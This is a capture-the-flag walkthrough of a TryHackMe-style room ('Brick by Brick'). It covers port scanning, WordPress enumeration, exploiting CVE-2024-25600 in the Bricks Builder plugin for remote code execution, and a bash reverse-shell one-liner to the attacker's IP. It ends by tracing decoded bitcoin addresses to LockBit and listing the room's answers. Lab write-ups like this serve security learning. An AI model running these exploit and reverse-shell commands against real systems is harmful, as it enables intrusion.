*By Praveen Kumar Sharma*

<hr>

For me the IP of the machine is : **10.10.161.74**

Lets try pinging it real quick

![[Pasted image 20240819204719.png]]

Its online!!

Firstly it is recommended us to add bricks.thm in /etc/hosts lets do that real quick 

![[Pasted image 20240819204921.png]]

Lets do some port scanning to start off 

<hr>

### Port Scanning : 

#### All Port Scan :

```
nmap -p- -n -Pn -T5 --min-rate=10000 10.10.161.74 -o allPortScan.txt
```

![[Pasted image 20240819205259.png]]

>[!Open Ports]
>PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

lets do a aggressive scan on these

#### Aggressive Scan : 

```
nmap -sC -sV -A -T5 -p 22,80,443,3306  10.10.161.74 -o aggressiveScan.txt
```

![[Pasted image 20240819205701.png]]
![[Pasted image 20240819205726.png]]
![[Pasted image 20240819205758.png]]

and some mysql we are gonna ignore

I think a we cant really access the one on port 80 so we dealing with https on 443 so we might need to consider that before running tools on this 

>[!Aggressive Scan]
>443/tcp  open  ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
|_http-generator: WordPress 6.5
|_ssl-date: TLS randomness does not represent time
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Brick by Brick

Now here we are gonna do direcotory fuzzing on https://bricks.thm 

<hr>

### Directory Fuzzing : 

```
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://bricks.thm/FUZZ -t 200
```

So this is gonna be very slow so im just gonna pick the important one here that is /admin and we already found /robots.txt from nmap scan on 443

Other than that we have these here it got stuck after a while

![[Pasted image 20240819210232.png]]

>[!Directories]
>/admin
>/robots.txt


Lets check the web application next

<hr>

### Web Application : 

U have to accept a certificate btw

![[Pasted image 20240819211243.png]]

This the default page 

![[Pasted image 20240819211418.png]]

Lets check the /admin first here 

![[Pasted image 20240819211528.png]]

alright wordpress lets run wpscan now 

<hr>

### Gaining Access : 

we need to run it with this 

![[Pasted image 20240819211722.png]]

the entire command would look like this 

```
wpscan --url https://bricks.thm --disable-tls-checks
```

This is the most interesting here 

![[Pasted image 20240819211955.png]]

Lets search a exploit for this 

Found this : https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress

Lets try this exploit

For this tho we need a download a pip module like this 

![[Pasted image 20240819212549.png]]

Now lets run it 

```
python3 exploit.py --url https://bricks.thm
```

![[Pasted image 20240819212715.png]]

We have RCE now lets get a shell now 

First start a listener : 

![[Pasted image 20240819213021.png]]

and then type in this in RCE : 

```
bash -c 'exec bash -i &>/dev/tcp/10.17.94.2/9001 <&1'
```

![[Pasted image 20240819213155.png]]

And we get a shell 

![[Pasted image 20240819213330.png]]

U can upgrade this if u want im ok with this for now 

# First Question's Answer : 

![[Pasted image 20240819213439.png]]

# Second Question's Answer : 

SO for the second one we need to lookup process like this 

```
systemctl list-units --type=service --all
```

![[Pasted image 20240819213941.png]]

For the second question answer we need to do this 

![[Pasted image 20240819214042.png]]

# Third Question's Answer : 

The third question we already have : ubuntu.service

# Forth Question's Answer : 

For this check the /lib/NetworkManager/ folder to find the log file 

![[Pasted image 20240819214446.png]]

This one is the readable only so this is the answer 

# Fifth Question's Answer : 

Lets head this inet.conf as this is a huge file 

![[Pasted image 20240819214620.png]]

```
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```

Lets check this hash at CyberChef

![[Pasted image 20240819214844.png]]

Lets check this first one 

![[Pasted image 20240819215121.png]]

The problem that im seeing here is that this is too long for a addres as it is 

![[Pasted image 20240819215323.png]]

So i see this string here which is command there might be two address here i think

![[Pasted image 20240819215423.png]]

First one : bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
Second one : bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa

Lets check 'em both in this finder i found : https://blockchair.com/

First one is valid 

![[Pasted image 20240819215645.png]]

Second one is not valid 

![[Pasted image 20240819215718.png]]

Lets see the first one first transaction sender that is our answer of the question

![[Pasted image 20240819220104.png]]

`50a89a628a6620216dca19f1221c138982601810fd60677ac7612a01999ae028`

Lets check this transaction :

![[Pasted image 20240819220255.png]]

Anwser : `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r`

# Sixth Question's Answer :

So lets lookup this address 

![[Pasted image 20240819220524.png]]

Here is the last answer 

![[Pasted image 20240819220549.png]]

Answer : Lockbit 

Thanks For Reading :)















